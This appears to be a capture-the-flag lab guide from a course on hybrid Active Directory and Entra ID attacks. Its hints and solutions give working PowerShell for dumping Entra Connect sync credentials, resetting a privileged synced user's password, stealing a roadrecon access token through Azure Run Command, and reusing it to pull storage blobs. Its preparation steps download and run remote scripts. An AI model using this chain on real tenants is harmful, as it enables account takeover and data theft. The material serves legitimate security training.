# LAB 4 : Capture the Flag (CTF) Challenge

## Preparations
1. RDP login to DC VM using the YOURDOMAIN\\**rootuser**, then run the following script as admin:
    ```powershell
    # when asked, login using the ENTRA CREDS (!)
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4PreparationScript.ps1" -OutFile "C:\\lab4PreparationScript.ps1"; `
    & "C:\\lab4PreparationScript.ps1"
    ```
    Ignores errors such as "*cannot be created because function capacity 4096 has been exceeded for this scope*"..

2. RDP login to Win11 VM using the YOURDOMAIN\\**user1**, then run the following script as admin:
    ```powershell
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4Win11VmPrepScript.ps1" -OutFile "C:\\lab4Win11VmPrepScript.ps1"; `
        & "C:\\lab4Win11VmPrepScript.ps1"
    ```
    keep this window open in the background - **you're not allowed to use it from now on**

## Instructions: Start Here
1. Your goal is to find the `secret.txt` file 
2. forget everything you knew: from this point on you DON'T know what the Entra admin password is (i.e. what's the password of ``user1`` / ``rootuser``), and what the VMs passwords are
3. **DO NOT** password reset or silver ticket (Seamless SSO) ``user1``
3. **Starting point:** as the attacker the only thing you have is the RDP session on the DC VM. Good luck! 

Do not use hints unless you really have to..

## Hints

<details>
    <summary><b>First hint: where the secret.txt file isn't stored</b></summary>

    The file isn't on any VM
</details>


<details>
    <summary><b>Entire attack path hint (use as last resort)</b></summary>

    1. Pass reset: DC vm -> reset pass of "user2" using Entra Sync credentials

    2. Login to Azure as that user using your browser

    3. Azure Portal Run Command on Win11 VM (the VM that has user1 logged on)

    4. Steal user1 PRT Cookie by running powershell script from the Run Command extension on the Azure portal 

    5. Use PRT Cookie to get access token and authenticate using PowerShell to MS Graph API read secret.txt from storage account
</details>



## Step 1

<details>
<summary><b>Hint 1</b></summary>
    
    1. Find a way to compromise a synced user in order to jump to the cloud

    2. Recon for roles / azure permissions to see which user you want to compromise

    3. it's not "user1"...
</details>


<details>
    <summary><b>Hint 2</b></summary>
    
    Abuse the Entra Connect password reset feature using AADInternals
</details>



<details>
<summary><b>Solution</b></summary>
on the DC VM:

```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$at = Get-AADIntAccessTokenForAADGraph
$tenant = Get-AADIntSyncConfiguration # get the tenant ID

Connect-AzureAD -AadAccessToken $at -TenantId $tenant.TenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
```

Enumerate users:
```powershell
# list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize

```
Target user2, as he holds a privileged role.. 

Reset the victim user's Entra password:
```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
```
</details>


## Step 2

<details>
    <summary><b>Hint 1</b></summary>
    
    Login to Azure as that user and see what you have access to
</details>

<details>
    <summary><b>Hint 2</b></summary>

    You can find the virtual machine Win11 and using the Run Command extension execute PowerShell script on it
</details>


<details>
    <summary><b>Hint 3</b></summary>
    
    Use this ability to get a PRT Cookie so you can impersonate as that user and steal its identity and permissions
</details>

<details>
    <summary><b>Hint 4</b></summary>

    user1 is a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant attack surface. Use that to your advantage.
</details>

<details>
<summary><b>Solution</b></summary>

    user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
    as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!

    Run the following command on the Win11 VM from the Run Command Window in the Azure portal:

```powershell
type c:\users\user1.YOURDOMAIN\desktop\.roadtools_auth
```
</details>

## Step 3
<details>
    <summary><b>Hint 1</b></summary>
    
    Using the acquired access token, what can you do?
    You may use your own PC / DC VM
</details>

<details>
    <summary><b>Hint 2</b></summary>
    
    Recon as that user and see what he has access to..

```powershell
$at = "eyJ"... # what you've obtained from the Run Command hack
$userUPN = "user2@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView


Connect-AzureAD -AccountId  $userUPN -TenantId $tenantId -AadAccessToken $at
Connect-AzAccount -AccountId  $userUPN -TenantId $tenantId -AccessToken $at 
```
</details>

<details>
    <summary><b>Hint 2</b></summary>
    
```powershell
# List current user's Azure Role Assignments using Azure PowerShell

$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
$roleAssignments | ForEach-Object {
    Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
}
```
</details>

<details>
    <summary><b>Hint 3</b></summary>
    
    We can see that there's a storage account that this user has access to..
</details>


<details>
    <summary><b>Solution</b></summary>
    
```powershell

# Recon as that user and see what he has access to..
$at = "eyJ"... # what you've obtained from the Run Command hack
$userUPN = "user1@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView


Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at
Connect-AzAccount -AccountId $userUPN -TenantId $tenantId -AccessToken $at 


# List current user's Azure Role Assignments using Azure PowerShell

$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
$roleAssignments | ForEach-Object {
    Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
}

# We can see that there's a storage account that this user has access to..
# Get all storage accounts
$storageAccounts = Get-AzStorageAccount

foreach ($storageAccount in $storageAccounts) {
    Write-Output "Storage Account: $($storageAccount.StorageAccountName)"

    # Get the context for the storage account
    $context = $storageAccount.Context

    # List all containers in the storage account
    $containers = Get-AzStorageContainer -Context $context

    foreach ($container in $containers) {
        Write-Output "  Container: $($container.Name)"

        # List all blobs in the container
        $blobs = Get-AzStorageBlob -Container $container.Name -Context $context

        foreach ($blob in $blobs) {
            Write-Output "    Blob: $($blob.Name)"

            # Download the blob content to a temporary location
            $tempFilePath = Join-Path -Path $env:TEMP -ChildPath $blob.Name
            Get-AzStorageBlobContent -Blob $blob.Name -Container $container.Name -Context $context -Destination $tempFilePath -Force

            # Print the content of the blob
            $blobContent = Get-Content -Path $tempFilePath
            Write-Output "      Content: $blobContent"
        }
    }
}
```

### The content of "secret.txt" in storage account is your medal, mazal tov hacker cracker!

#### Bonus: 
Go back to the beginning, and try steal user1 identity using silver ticket (Seamless SSO) instead of password reset
</details>


## Don't forget
Once done, delete the lab resource groups to clean up the resources